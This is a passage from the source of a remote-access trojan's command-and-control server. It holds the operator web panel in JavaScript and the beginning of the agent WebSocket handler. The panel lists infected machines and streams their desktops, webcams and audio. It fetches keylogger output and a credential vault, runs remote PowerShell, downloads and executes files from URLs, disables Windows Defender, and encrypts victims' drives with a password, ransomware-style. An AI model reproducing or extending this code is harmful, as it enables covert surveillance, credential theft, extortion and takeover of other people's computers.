                <button class="btn" onclick="lc('fetch')">🔄 Fetch Buffer</button>
            </div>
            <pre id="kl" style="color:var(--green);font-family:monospace;background:#0a0a16;padding:16px;border-radius:6px;min-height:220px;white-space:pre-wrap;border:1px solid var(--border)"></pre>
        </div>
    </div>
</div>

<div id="vm" class="ov" onclick="if(event.target===this)closeM('vm')">
    <div class="mb">
        <div class="mh"><span>🔑 Credential Vault</span><button onclick="closeM('vm')">✕ Close</button></div>
        <div class="mc"><pre id="vd" style="color:var(--green);font-family:monospace;white-space:pre-wrap"></pre></div>
    </div>
</div>

<script>
let aid=null,ws=null,tres={w:1920,h:1080},cv_mode='screen';
let _viewerWsMode='main';
let _rxBinChain=Promise.resolve();
let _wsReconnectTimer=null,_wsBackoffMs=2000;
const cv=document.getElementById('cv');
let cx=null;
try{cx=cv.getContext('2d');}catch(e){console.warn('Canvas ctx:',e)}

/* Dropdowns logic */
document.querySelectorAll('.combo-btn').forEach(b => {
    b.onclick = (e) => {
        e.stopPropagation();
        const p = b.nextElementSibling;
        const showing = p.classList.contains('show');
        document.querySelectorAll('.combo-panel').forEach(x => x.classList.remove('show'));
        if (!showing) p.classList.add('show');
    };
});
document.addEventListener('click', () => {
    document.querySelectorAll('.combo-panel').forEach(x => x.classList.remove('show'));
});

/* Webcam Recording logic */
let mediaRec;
let recChunks = [];
function _pickWebmMime(){
    const c=['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm'];
    for(let i=0;i<c.length;i++){ if(MediaRecorder.isTypeSupported(c[i])) return c[i]; }
    return '';
}
function toggleRec() {
    if (mediaRec && mediaRec.state === 'recording') {
        mediaRec.stop();
        const btn = document.getElementById('recBtn');
        btn.textContent = '🔴 RECORD';
        btn.style.background = '#ff4d6a';
    } else {
        if(!cv.width || !cv.height){
            alert('Wait until the webcam preview is visible, then start recording.');
            return;
        }
        const stream = cv.captureStream(30);
        const vtracks = stream.getVideoTracks();
        if(!vtracks || !vtracks.length){
            alert('Canvas capture is not available yet — wait a moment and try again.');
            return;
        }
        const mime = _pickWebmMime();
        if(!mime){
            alert('Video recording is not supported in this browser.');
            return;
        }
        try{
            mediaRec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 2500000 });
        }catch(e){
            alert('Could not start recorder: '+(e&&e.message?e.message:String(e)));
            return;
        }
        recChunks = [];
        mediaRec.ondataavailable = e => { if(e.data && e.data.size > 0) recChunks.push(e.data); };
        mediaRec.onstop = () => {
            const blob = new Blob(recChunks, { type: mime.split(';')[0] || 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = 'webcam_capture.webm';
            document.body.appendChild(a);
            a.click();
            setTimeout(() => { document.body.removeChild(a); window.URL.revokeObjectURL(url); }, 100);
            recChunks = [];
            mediaRec = null;
        };
        mediaRec.onerror = e => { console.error('MediaRecorder', e); alert('Recording failed — see console.'); };
        try{
            mediaRec.start(100);
        }catch(e){
            alert('Recording start failed: '+(e&&e.message?e.message:String(e)));
            mediaRec = null;
            return;
        }
        const btn = document.getElementById('recBtn');
        btn.textContent = '⏹ STOP';
        btn.style.background = '#555';
    }
}

function updateStatus(){
    const statusEl = document.getElementById('statusBar');
    if(!statusEl) return;
    if(!aid){
        statusEl.textContent = 'Status: no client selected';
        return;
    }
    const session = window._sessions && window._sessions[aid];
    const host = document.getElementById('node_tag').textContent || aid;
    const mode = cv_mode === 'cam' ? 'Webcam' : 'Desktop';
    const audio = audio_enabled ? 'Audio ON' : 'Audio OFF';
    const mic = micEnabled ? 'Mic ON' : 'Mic OFF';
    statusEl.textContent = `Viewing: ${host} · ${mode} · ${audio} · ${mic}`;
}

function clearViewerReconnect(){
    if(_wsReconnectTimer){ clearTimeout(_wsReconnectTimer); _wsReconnectTimer=null; }
}
function connectViewerWs(nodeId, opts){
    opts = opts || {};
    const resetBackoff = opts.resetBackoff !== false;
    if(!nodeId) return;
    clearViewerReconnect();
    if(resetBackoff) _wsBackoffMs = 2000;
    const baseWs = location.protocol==='https:'?'wss':'ws';
    const url = _viewerWsMode==='cam'
        ? `${baseWs}://${location.host}/ws/viewer_cam/${nodeId}`
        : `${baseWs}://${location.host}/ws/viewer/${nodeId}`;
    if(ws){
        try{ ws.onclose=null; ws.close(); }catch(_e){}
        ws=null;
    }
    console.log('Connecting viewer WS to', url);
    ws=new WebSocket(url);
    ws.binaryType='blob';
    ws.onmessage=onMsg;
    ws.onerror=()=>{ console.error('Viewer WS error'); try{ if(ws) ws.close(); }catch(_e){} };
    ws.onopen=()=>{
        console.log('Viewer WS connected, sending CMD_VIEW');
        _wsBackoffMs=2000;
        if(audio_enabled) void resumeRxAudio();
        try{ snd({cmd:0x15,args:{mode:cv_mode,audio:audio_enabled}}); }catch(_e){}
    };
    ws.onclose=(ev)=>{
        console.log('Viewer WS closed:', ev.code, ev.reason);
        ws=null;
        updateStatus();
        if(aid && aid===nodeId){
            const delay = Math.min(_wsBackoffMs + Math.floor(Math.random()*600), 60000);
            _wsReconnectTimer=setTimeout(()=>{
                _wsReconnectTimer=null;
                _wsBackoffMs=Math.min(Math.round(_wsBackoffMs*1.65),45000);
                connectViewerWs(nodeId, {resetBackoff:false});
            },delay);
        }
    };
}

function sel(id,info){
    _viewerWsMode='main';
    aid=id;
    if(info.res)tres=info.res;
    document.getElementById('node_tag').style.display='inline-block';
    document.getElementById('node_tag').textContent=info.hostname.toUpperCase();
    document.getElementById('disconnectBar').style.display='block';
    audio_enabled = false;
    const audioBtn = document.getElementById('pa');
    if(audioBtn) audioBtn.classList.remove('on');
    connectViewerWs(id);
    updateStatus();
    sync();
}

async function handleBlobMessage(blob){
    const buf = await blob.arrayBuffer();
    const arr = new Uint8Array(buf);
    if(arr[0] === 2){
        playAudioWave(arr.subarray(1));
        return;
    }
    if(arr[0] === 4){
        playPCM(arr.subarray(1));
        return;
    }
    const jblob = new Blob([arr.subarray(1)], { type: 'image/jpeg' });
    if(window.createImageBitmap){
        try{
            const bm = await createImageBitmap(jblob);
            if(cv.width !== bm.width || cv.height !== bm.height){ cv.width = bm.width; cv.height = bm.height; }
            cx.drawImage(bm, 0, 0);
            bm.close();
        }catch(_e){ drawJpegFallback(jblob); }
    }else{
        drawJpegFallback(jblob);
    }
}
function onMsg(e){
    if(e.data instanceof Blob){
        console.log('Received blob:', e.data.size, 'bytes');
        _rxBinChain = _rxBinChain.then(() => handleBlobMessage(e.data)).catch(()=>{});
        return;
    }
    if(typeof e.data === 'string'){
        try{
            const m=JSON.parse(e.data);
            if(m.cmd===0x0F&&m.data){
                if(m.data.status==='running') return;
                const o=m.data.out||'';
                if(m.data.shellId==='pop') atPop(o, true); else at(o, true);
            }
            if(m.cmd===0x11&&m.data)rfs(m.data);
            if(m.cmd===0x13&&m.data)dlb(m.data);
            if(m.cmd===0x0C)document.getElementById('kl').textContent+=m.data;
            if(m.cmd===0x30||m.cmd===0x32){document.getElementById('vd').textContent=m.data;openM('vm')}
            if(m.cmd===0x41&&m.data&&m.data.out){ at(m.data.out, true); }
        }catch(err){}
    }
}

function snd(o){
    if(ws&&ws.readyState===1){
        ws.send(JSON.stringify(o));
    }
}
function sc(c){snd({cmd:c,args:{}})}

let audio_enabled=false;
let micEnabled=false;
let micStream=null;
let micContext=null;
let micProcessor=null;

function drawJpegFallback(blob){
    const img = new Image();
    const u = URL.createObjectURL(blob);
    img.onload = () => {
        if(cv.width !== img.width || cv.height !== img.height){ cv.width = img.width; cv.height = img.height; }
        cx.drawImage(img, 0, 0);
        URL.revokeObjectURL(u);
    };
    img.src = u;
}

let rxAudioCtx=null;
let rxNextTime=0;
function ensureRxAudio(){
    if(!rxAudioCtx) rxAudioCtx = new (window.AudioContext||window.webkitAudioContext)();
    return rxAudioCtx;
}
async function resumeRxAudio(){
    const ctx = ensureRxAudio();
    if(ctx.state === 'suspended'){
        try{ await ctx.resume(); }catch(e){ console.warn('AudioContext resume', e); }
    }
    return ctx;
}
function playPCM(body){
    if(body.length < 4) return;
    const sr = body[0] | (body[1] << 8);
    const n = body[2] | (body[3] << 8);
    const pcm = body.subarray(4, 4 + n * 2);
    if(n <= 0 || pcm.length < n * 2) return;
    void resumeRxAudio().then(ctx=>{
        try{
            if(!ctx) return;
            const buf = ctx.createBuffer(1, n, sr || 44100);
            const fd = buf.getChannelData(0);
            const copy = new ArrayBuffer(pcm.byteLength);
            new Uint8Array(copy).set(pcm);
            const view = new Int16Array(copy);
            for(let i = 0; i < n; i++) fd[i] = view[i] / 32768;
            const src = ctx.createBufferSource();
            src.buffer = buf;
            src.connect(ctx.destination);
            const now = ctx.currentTime;
            if(rxNextTime < now) rxNextTime = now;
            if(rxNextTime - now > 0.22) rxNextTime = now + 0.03;
            src.start(rxNextTime);
            rxNextTime += buf.duration;
        }catch(err){ console.error('playPCM', err); }
    }).catch(e=>console.warn('playPCM resume', e));
}

function playAudioWave(u8){
    const audio = document.getElementById('audioPlayer');
    const url = URL.createObjectURL(new Blob([u8], { type: 'audio/wav' }));
    audio.src = url;
    audio.style.display = 'block';
    audio.play().catch(()=>{});
    setTimeout(()=>URL.revokeObjectURL(url), 8000);
}

function encodeWav(samples, sampleRate){
    const buffer = new ArrayBuffer(44 + samples.length * 2);
    const view = new DataView(buffer);
    function writeString(str, offset){
        for(let i=0;i<str.length;i++) view.setUint8(offset + i, str.charCodeAt(i));
    }
    writeString('RIFF', 0);
    view.setUint32(4, 36 + samples.length * 2, true);
    writeString('WAVE', 8);
    writeString('fmt ', 12);
    view.setUint32(16, 16, true);
    view.setUint16(20, 1, true);
    view.setUint16(22, 1, true);
    view.setUint32(24, sampleRate, true);
    view.setUint32(28, sampleRate * 2, true);
    view.setUint16(32, 2, true);
    view.setUint16(34, 16, true);
    writeString('data', 36);
    view.setUint32(40, samples.length * 2, true);
    let offset = 44;
    for(let i=0;i<samples.length;i++){
        let s = Math.max(-1, Math.min(1, samples[i]));
        view.setInt16(offset, s < 0 ? s * 0x8000 : s * 0x7FFF, true);
        offset += 2;
    }
    return buffer;
}

function floatToPcm16(f32){
    const n = f32.length;
    const sr = Math.min(65535, micContext ? micContext.sampleRate : 48000);
    const out = new Uint8Array(4 + n * 2);
    out[0] = sr & 255;
    out[1] = (sr >> 8) & 255;
    out[2] = n & 255;
    out[3] = (n >> 8) & 255;
    const dv = new DataView(out.buffer, 4, n * 2);
    for(let i = 0; i < n; i++){
        let x = Math.max(-1, Math.min(1, f32[i]));
        dv.setInt16(i * 2, x < 0 ? x * 0x8000 : x * 0x7FFF, true);
    }
    return out;
}

async function startMic(){
    if(micStream) return;
    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
        alert('Microphone capture not available in this browser.');
        micEnabled=false;
        return;
    }
    try{
        micStream = await navigator.mediaDevices.getUserMedia({
            audio: {
                channelCount: 1,
                echoCancellation: true,
                noiseSuppression: true,
                autoGainControl: true,
                sampleRate: { ideal: 48000 },
            },
        });
        micContext = new (window.AudioContext||window.webkitAudioContext)({ sampleRate: 48000 });
        const src = micContext.createMediaStreamSource(micStream);
        const bufSize = 512;
        micProcessor = micContext.createScriptProcessor(bufSize, 1, 1);
        micProcessor.onaudioprocess = e => {
            if(!micEnabled || !ws || ws.readyState !== 1) return;
            const data = e.inputBuffer.getChannelData(0);
            const hdr = floatToPcm16(data);
            const packet = new Uint8Array(1 + hdr.length);
            packet[0] = 3;
            packet.set(hdr, 1);
            try{
                ws.send(packet);
            }catch(err){
                console.error('Mic send failed', err);
            }
        };
        src.connect(micProcessor);
        const mute = micContext.createGain();
        mute.gain.value = 0;
        micProcessor.connect(mute);
        mute.connect(micContext.destination);
        document.getElementById('pmic').classList.add('on');
        updateStatus();
    }catch(err){
        micEnabled=false;
        micStream=null;
        micContext=null;
        micProcessor=null;
        alert('Microphone permission denied or unavailable.');
    }
}

function stopMic(){
    if(micProcessor){
        micProcessor.disconnect();
        micProcessor=null;
    }
    if(micStream){
        micStream.getTracks().forEach(t=>t.stop());
        micStream=null;
    }
    if(micContext){
        micContext.close();
        micContext=null;
    }
    const btn=document.getElementById('pmic');
    if(btn) btn.classList.remove('on');
    updateStatus();
}

function toggleMic(){
    micEnabled = !micEnabled;
    const btn=document.getElementById('pmic');
    if(btn) btn.classList.toggle('on', micEnabled);
    if(micEnabled) startMic(); else stopMic();
}

function openCamTab(){
    if(!aid){
        alert('Select a node first');
        return;
    }
    window.open(`${location.origin}${location.pathname}?cam=1&id=${encodeURIComponent(aid)}`, '_blank');
}

function openCamViewer(id){
    aid=id;
    cv_mode='cam';
    audio_enabled=true;
    document.getElementById('node_tag').style.display='inline-block';
    document.getElementById('node_tag').textContent=id.toUpperCase();
    const btn = document.getElementById('pa');
    if(btn) btn.classList.add('on');
    const audio = document.getElementById('audioPlayer');
    if(audio) audio.style.display = 'block';
    _viewerWsMode='cam';
    connectViewerWs(id);
    rxNextTime = 0;
    void resumeRxAudio();
    updateStatus();
}

function toggleAudio(){
    audio_enabled = !audio_enabled;
    const btn = document.getElementById('pa');
    if(btn) btn.classList.toggle('on', audio_enabled);
    const audio = document.getElementById('audioPlayer');
    if(audio) audio.style.display = audio_enabled ? 'block' : 'none';
    snd({cmd:0x15,args:{mode:cv_mode,audio:audio_enabled}});
    rxNextTime = 0;
    if(audio_enabled) void resumeRxAudio();
    updateStatus();
}

/* View Switch: Desktop ↔ Webcam */
function sw(mode){
    cv_mode=mode;
    snd({cmd:0x15,args:{mode:mode,audio:audio_enabled}});
    if(audio_enabled){ rxNextTime = 0; void resumeRxAudio(); }
    document.getElementById('ps').classList.toggle('on',mode==='screen');
    document.getElementById('pc').classList.toggle('on',mode==='cam');
    document.getElementById('vlbl').textContent=mode==='cam'?'📹 Webcam Live':'🖥 Desktop';
    document.getElementById('recBtn').style.display=mode==='cam'?'block':'none';
    if(mode !== 'cam' && mediaRec && mediaRec.state === 'recording') {
        toggleRec();
    }
    updateStatus();
}

/* Shell + panel width */
let _explorerPath='DRIVES';
function clampPsW(w){
    const lo=220,hi=Math.floor(window.innerWidth*0.78);
    return Math.min(Math.max(w,lo),hi);
}
function resizePs(delta){
    const rp=document.getElementById('rp');
    if(!rp)return;
    let nw;
    if(delta===0)nw=360;
    else nw=clampPsW(rp.getBoundingClientRect().width+delta);
    document.documentElement.style.setProperty('--ps-w',nw+'px');
    try{localStorage.setItem('psPanelW',String(nw));}catch(e){}
}
function applyStoredPsWidth(){
    try{
        const s=localStorage.getItem('psPanelW');
        if(s){const nw=clampPsW(parseInt(s,10)||360);document.documentElement.style.setProperty('--ps-w',nw+'px');}
    }catch(e){}
}
window.addEventListener('resize',()=>{
    const rp=document.getElementById('rp');
    if(!rp)return;
    const w=rp.getBoundingClientRect().width;
    if(w>window.innerWidth*0.78){
        const nw=clampPsW(w);
        document.documentElement.style.setProperty('--ps-w',nw+'px');
        try{localStorage.setItem('psPanelW',String(nw));}catch(e){}
    }
});

let _termFs=parseInt(localStorage.getItem('termFs'))||12;
let _termFsPop=parseInt(localStorage.getItem('termFsPop'))||11;
let _termScrollLock=false;
document.documentElement.style.setProperty('--term-fs',_termFs+'px');
document.documentElement.style.setProperty('--term-fs-pop',_termFsPop+'px');
function termFs(d){
    _termFs=Math.max(7,Math.min(32,_termFs+d));
    _termFsPop=Math.max(7,Math.min(32,_termFsPop+d));
    document.documentElement.style.setProperty('--term-fs',_termFs+'px');
    document.documentElement.style.setProperty('--term-fs-pop',_termFsPop+'px');
    try{localStorage.setItem('termFs',String(_termFs));localStorage.setItem('termFsPop',String(_termFsPop));}catch(e){}
}
function termScrollLock(){
    _termScrollLock=!_termScrollLock;
    document.getElementById('slBtn').style.opacity=_termScrollLock?'0.35':'1';
}

function doSh(){
    const v=document.getElementById('sh').value;
    if(!v)return;
    snd({cmd:0x0F,args:{cmd:v,shellId:'side'}});
    at('PS> '+v);
    at('<span class="run-dot">⏳ running...</span>', true);
    document.getElementById('sh').value='';
}
function _esc(str){
    const d=document.createElement('div');
    d.appendChild(document.createTextNode(str));
    return d.innerHTML;
}
function at(t, isRunning){
    const el=document.getElementById('term');
    if(!el)return;
    if(isRunning && el._lastRunningLine){
        el._lastRunningLine.outerHTML='';
        el._lastRunningLine=null;
    }
    const d=document.createElement('div');
    d.innerHTML=isRunning ? t : _esc(t);
    el.appendChild(d);
    if(isRunning) el._lastRunningLine=d;
    if(!_termScrollLock) el.scrollTop=el.scrollHeight;
    while(el.children.length>500) el.removeChild(el.firstChild);
}
function atPop(t, isRunning){
    const el=document.getElementById('termPop');
    if(!el)return;
    if(isRunning && el._lastRunningLine){
        el._lastRunningLine.outerHTML='';
        el._lastRunningLine=null;
    }
    if(t===null||t===undefined) t='';
    const d=document.createElement('div');
    d.innerHTML=isRunning ? t : _esc(t);
    el.appendChild(d);
    if(isRunning) el._lastRunningLine=d;
    el.scrollTop=el.scrollHeight;
    while(el.children.length>500) el.removeChild(el.firstChild);
}
function doShPop(){
    const inp=document.getElementById('shPop');
    const ov=document.getElementById('termm');
    const v=inp&&inp.value;
    if(!v)return;
    const cwdRaw=(ov&&ov.dataset.cwd)||'';
    const cwd=cwdRaw?_normWinPath(cwdRaw):'';
    snd({cmd:0x0F,args:{cmd:v,cwd:cwd||undefined,shellId:'pop'}});
    atPop('PS> '+v);
    atPop('<span class="run-dot">⏳ running...</span>', true);
    inp.value='';
}
function _normWinPath(p){
    var bs=String.fromCharCode(92);
    var s=String(p||'').trim().split('/').join(bs);
    while(s.indexOf(bs+bs)>=0){ s=s.split(bs+bs).join(bs); }
    return s;
}
function openTermHere(fp){
    if(!aid){alert('Select a connected node first.');return;}
    const p=_normWinPath(fp);
    const apply=()=>{
        const ov=document.getElementById('termm');
        const lab=document.getElementById('termPathLabel');
        if(ov)ov.dataset.cwd=p;
        if(lab)lab.textContent=p||'(root)';
        const tp=document.getElementById('termPop');
        if(tp)tp.textContent='Remote PowerShell · cwd on target:'+String.fromCharCode(10)+p+String.fromCharCode(10,10);
        const sh=document.getElementById('shPop');
        if(sh)sh.value='';
        openM('termm');
        requestAnimationFrame(()=>{try{document.getElementById('shPop').focus();}catch(_e){}});
    };
    if(ws&&ws.readyState===1){apply();return;}
    if(ws&&ws.readyState===0){
        ws.addEventListener('open',()=>apply(),{once:true});
        return;
    }
    alert('Connection not ready. Select the node again, then open terminal here.');
}
function openTermHereFromExplorer(){
    if(!_explorerPath||_explorerPath==='DRIVES'){alert('Open a folder first (not only Drives list).');return;}
    let p=_explorerPath.replace(/\\\\/g,'/');
    openTermHere(p);
}

/* File Explorer */
function openExp(){openM('fem');nav('DRIVES')}
function nav(p){snd({cmd:0x11,args:{path:p}})}
function rfs(d){
    _explorerPath=d.path;
    const bc=document.getElementById('bc');
    if(bc)bc.textContent=d.error?(d.path+' — '+d.error):d.path;
    const fl=document.getElementById('fl');fl.innerHTML='';
    if(d.path !== "DRIVES"){
        const up=document.createElement('div');up.className='fi';
        up.innerHTML='<span class="fn" onclick="nav(\\''+d.path.replace(/\\\\/g,'/')+'/..\\')">📁 ..</span>';
        fl.appendChild(up);
    }
    d.items.sort((a,b)=>b.is_dir-a.is_dir||a.name.localeCompare(b.name)).forEach(i=>{
        const r=document.createElement('div');r.className='fi';
        const fp = d.path === 'DRIVES' ? i.name.replace(/\\\\/g, '/') : (d.path + '/' + i.name).replace(/\\\\/g, '/').replace(/\\/\\//g, '/');
        const sz=i.is_dir?'':fsz(i.size);
        const termBtn=i.is_dir?`<button type="button" class="bsm bsm-term" onclick='openTermHere(${JSON.stringify(fp)})'>💻 PS</button>`:'';
        const fpEsc=fp.replace(/\\'/g,"\\\\'");
        const fileLockBtns=!i.is_dir?`<button type="button" class="bsm" onclick="encP('${fpEsc}')">🔒 Lock</button><button type="button" class="bsm" onclick="decP('${fpEsc}')">🔓 Decrypt</button>`:'';
        r.innerHTML=`<span class="fn" onclick="${i.is_dir?`nav('${fpEsc}')`:''}">
            ${i.is_dir?'📁':'📄'} ${i.name}</span>
            <span class="fs">${sz}</span>
            <div class="fi-actions">
                ${fileLockBtns}
                ${!i.is_dir?`<button type="button" class="bsm" onclick="dlf('${fpEsc}')">⬇ DL</button>`:''}
                <button type="button" class="bsm" onclick="${i.is_dir?`nav('${fpEsc}')`:`rf('${fpEsc}')`}">${i.is_dir?'📂 OPEN':'▶ RUN'}</button>
                ${termBtn}
            </div>`;
        fl.appendChild(r);
    });
}
function fsz(s){if(s>1048576)return(s/1048576).toFixed(1)+' MB';if(s>1024)return(s/1024).toFixed(1)+' KB';return s+' B'}
function dlf(p){snd({cmd:0x13,args:{path:p}})}
function rf(p){snd({cmd:0x12,args:{path:p}})}
function sendSoundFile(){
    const input = document.getElementById('sndFile');
    if(!input || !input.files || !input.files.length){
        alert('Select an audio file first.');
        return;
    }
    if(!ws || ws.readyState !== 1){
        alert('Connect to a node first.');
        return;
    }
    const file = input.files[0];
    const reader = new FileReader();
    reader.onload = () => {
        const data = new Uint8Array(reader.result);
        const total = data.length;
        const RAW_CHUNK = 24576;
        snd({cmd:0x60,args:{name:file.name,reset:true,size:total}});
        let off = 0;
        function b64Chunk(u8){
            const step = 8192;
            let bin = '';
            for(let i = 0; i < u8.length; i += step){
                const sub = u8.subarray(i, Math.min(i + step, u8.length));
                bin += String.fromCharCode.apply(null, sub);
            }
            return btoa(bin);
        }
        function sendNext(){
            if(off >= total){
                snd({cmd:0x60,args:{name:file.name,end:true}});
                closeM('sndm');
                return;
            }
            const slice = data.subarray(off, Math.min(off + RAW_CHUNK, total));
            off += slice.length;
            const last = off >= total;
            snd({cmd:0x60,args:{name:file.name,b64:b64Chunk(slice),end:last}});
            setTimeout(sendNext, 0);
        }
        sendNext();
    };
    reader.readAsArrayBuffer(file);
}
function dlb(d){
    const bin=atob(d.bytes);const a=new Uint8Array(bin.length);
    for(let i=0;i<bin.length;i++)a[i]=bin.charCodeAt(i);
    const b=new Blob([a]);const l=document.createElement('a');
    l.href=URL.createObjectURL(b);l.download=d.name;l.click();
}

/* Tools */
function doUrl(){const u=document.getElementById('ui').value;if(u)snd({cmd:0x40,args:{url:u}});closeM('urlm')}
function doDl(){
    const u=document.getElementById('di').value;
    if(u)snd({cmd:0x41,args:{url:u}});
    closeM('dlm');
}
function doDlEx(){
    const url=document.getElementById('runUrl').value;
    const args=document.getElementById('runArgs').value;
    const terminal=document.getElementById('runTerminal').checked;
    if(!url){alert('Enter a URL first.');return;}
    snd({cmd:0x41,args:{url:url,args:args||'',terminal:terminal}});
    closeM('runm');
    if(terminal) at('> Downloading and running '+url.split('/').pop()+'...');
}
function doRunLocalExe(){
    const path=document.getElementById('runLocalPath').value;
    const terminal=document.getElementById('runTerminal').checked;
    if(!path){alert('Enter a file path.');return;}
    snd({cmd:0x43,args:{path:path,args:'',terminal:terminal}});
    closeM('runm');
    if(terminal) at('> Running local: '+path);
}
function doDisableDefender(){
    if(!confirm('⚠️ This will attempt to disable Windows Defender on the target. Continue?'))return;
    snd({cmd:0x42,args:{}});
    at('> Disabling Windows Defender (multi-layer)...');
}
function lc(a){snd({cmd:0x0C,args:{action:a}})}
function doLock(){const p=prompt('🔒 Enter lock password:');if(p)snd({cmd:0x20,args:{password:p}})}
function doEnc(){
    if(!confirm('⚠️ WARNING: This will encrypt files on the target. Continue?'))return;
    const tgt=prompt('Optional: Folders/Drives to encrypt (comma separated, e.g. C:\\Users, D:\\). Leave empty for ALL DRIVES:');
    if(tgt === null)return;
    const p=prompt('Enter encryption password (SAVE THIS):');
    if(p)snd({cmd:0x21,args:{password:p, targets:tgt}});
}
function doDec(){
    const tgt=prompt('Optional: Folders/Drives to decrypt (comma separated). Leave empty for ALL DRIVES:');
    if(tgt === null)return;
    const p=prompt('Enter decryption password:');
    if(p)snd({cmd:0x22,args:{password:p, targets:tgt}});
}
function encP(p){
    const pass=prompt(`🔒 Enter password to encrypt this specific target:\\n${p}\\n(SAVE THIS PASSWORD)`);
    if(pass) snd({cmd:0x21,args:{password:pass, targets:p}});
}
function decP(p){
    const pass=prompt(`🔓 Enter password to unlock this specific target:\\n${p}`);
    if(pass) snd({cmd:0x22,args:{password:pass, targets:p}});
}

/* HID — rAF-coalesced mouse for smoother remote control */
let _hidMx=null,_hidMy=null,_hidRaf=null,_hidLastSend=0;
function flushMouse(){
    _hidRaf=null;
    if(!ws||!aid||_hidMx==null)return;
    snd({cmd:0x50,args:{x:_hidMx,y:_hidMy}});
    _hidLastSend=performance.now();
}
cv.addEventListener('mousemove',e=>{
    if(!ws||!aid)return;
    const r=cv.getBoundingClientRect();
    const rw=Math.max(1,r.width),rh=Math.max(1,r.height);
    _hidMx=Math.round((e.clientX-r.left)/rw*tres.w);
    _hidMy=Math.round((e.clientY-r.top)/rh*tres.h);
    const t=performance.now();
    if(t-_hidLastSend>32){ flushMouse(); return; }
    if(!_hidRaf) _hidRaf=requestAnimationFrame(flushMouse);
});
cv.addEventListener('mousedown',e=>{
    e.preventDefault();
    if(_hidRaf){cancelAnimationFrame(_hidRaf);_hidRaf=null;}
    flushMouse();
    snd({cmd:0x51,args:{btn:e.button===0?'left':'right',down:true}});
});
cv.addEventListener('mouseup',e=>{snd({cmd:0x51,args:{btn:e.button===0?'left':'right',down:false}})});
cv.addEventListener('contextmenu',e=>e.preventDefault());
document.addEventListener('keydown',e=>{
    if(!ws||document.activeElement.tagName==='INPUT'||document.activeElement.tagName==='TEXTAREA')return;
    if(e.repeat)return;
    e.preventDefault();
    let k=e.key.toLowerCase();
    if(k==='control')k='ctrl';if(k==='escape')k='esc';
    snd({cmd:0x52,args:{key:k}});
});

/* Modals */
function openM(id){document.getElementById(id).classList.add('open')}
function closeM(id){document.getElementById(id).classList.remove('open')}

/* Sync */
async function sync(){
    const statusEl = document.getElementById('statusBar');
    try{
        const ctrl = new AbortController();
        setTimeout(()=>ctrl.abort(), 5000);
        const r=await fetch('/known_clients', {signal: ctrl.signal});
        const c=await r.json();
        const el=document.getElementById('clist');
        if(!el) return;
        el.innerHTML='';
        const ids=Object.keys(c);
        if(!ids.length){
            el.innerHTML='<div class="es">⏳ AWAITING NODES...</div>';
            if(statusEl) statusEl.textContent='Status: no known agents';
            return;
        }
        const online = Object.values(c).filter(v => v.status === 'online').length;
        if(!aid){
            if(statusEl) statusEl.textContent=`Status: ${online} online / ${ids.length} total`;
        } else {
            updateStatus();
        }
        const sorted = ids.sort((a,b) => {
            const sa = c[a].status === 'online' ? 0 : 1;
            const sb = c[b].status === 'online' ? 0 : 1;
            return sa - sb;
        });
        sorted.forEach(id=>{
            const d=document.createElement('div');
            const info = c[id];
            const active_class = id===aid ? ' act' : '';
            const offline_class = info.status === 'offline' ? ' offline' : '';
            d.className='nd'+active_class+offline_class;
            const os = info.os || '';
            const name = info.hostname || 'Unknown';
            const online_badge = info.status === 'online'
                ? '<span class="bg">⚡ online</span>'
                : '<span class="bg offline-badge">⏻ offline</span>';
            const lastSeen = info.status === 'offline'
                ? '<span class="last-seen">last seen ' + Math.floor((Date.now()/1000 - (info.last_seen||0))/60) + 'm ago</span>'
                : '';
            d.innerHTML=`<b>${name}</b><span class="os">${os.length>30?os.substring(0,30)+'...':os}</span>${online_badge}${lastSeen}`;
            d.onclick = () => {
                if(info.status === 'offline') return;
                sel(id, info.info || info);
            };
            el.appendChild(d);
        });
    }catch(e){
        console.error('Sync failed:', e.name, e.message);
        if(statusEl) statusEl.textContent='Status: error loading clients';
        const el=document.getElementById('clist');
        if(el) el.innerHTML='<div class="es">⚠️ ERROR: '+e.message+'</div>';
    }
}
function doDisconnect(){
    clearViewerReconnect();
    if(ws){ try{ ws.onclose=null; ws.close(); }catch(_e){} ws=null; }
    aid=null;
    document.getElementById('node_tag').style.display='none';
    document.getElementById('node_tag').textContent='';
    document.getElementById('disconnectBar').style.display='none';
    const statusEl = document.getElementById('statusBar');
    if(statusEl) statusEl.textContent='Status: disconnected';
    const el=document.getElementById('clist');
    if(el) el.querySelectorAll('.nd').forEach(n=>n.classList.remove('act'));
}
async function loadLogs(){
    try{
        const r=await fetch('/server_logs?lines=100');
        const text=await r.text();
        document.getElementById('logArea').textContent=text || 'No logs available.';
    }catch(e){
        console.error('Log load failed', e);
        document.getElementById('logArea').textContent='Unable to load logs.';
    }
}
document.addEventListener('DOMContentLoaded', ()=>{
    applyStoredPsWidth();
    const params = new URLSearchParams(location.search);
    if(params.get('cam') === '1' && params.get('id')){
        openCamViewer(params.get('id'));
        const sidebar = document.getElementById('sidebar');
        const topnav = document.getElementById('topnav');
        if(sidebar) sidebar.style.display = 'none';
        if(topnav) topnav.style.display = 'none';
    }
});
setInterval(sync,3000);sync();
loadLogs();
setInterval(loadLogs,5000);
setInterval(function(){
    if(ws&&ws.readyState===1){
        try{ ws.send(JSON.stringify({cmd:0x7E,args:{}})); }catch(_e){}
    }
},5000);
document.addEventListener('visibilitychange',()=>{
    if(document.visibilityState==='visible'){ sync(); loadLogs(); }
});
</script>
</body>
</html>
"""


# ─── WebSocket Endpoints ─────────────────────────────────────

@app.websocket("/ws/client")
async def ws_client(websocket: WebSocket):
    await websocket.accept()
    logger.info("⚡ Agent connection attempt...")
    device_id = None
    try:
        while True:
            raw = await websocket.receive()
            parsed = _ws_payload(raw)
            if parsed is None:
                break
            kind, payload = parsed
            if kind == "skip":
                continue
            if kind == "bytes":
                if device_id:
                    session = await state.get_client(device_id)
                    if session:
                        session.last_seen = time.time()
                        await session.broadcast_bytes(payload)
            elif kind == "text":
                data = json.loads(payload)
                if data.get("cmd") == CMD_REG:
                    device_id = data["data"]["id"]
                    info = data["data"]
                    await state.set_client(device_id, ClientSession(websocket, info))
                    known_clients[device_id] = {
                        "hostname": info.get("hostname", "?"),
                        "os": info.get("os", "?"),
                        "status": "online",
                        "first_seen": known_clients.get(device_id, {}).get("first_seen", time.time()),
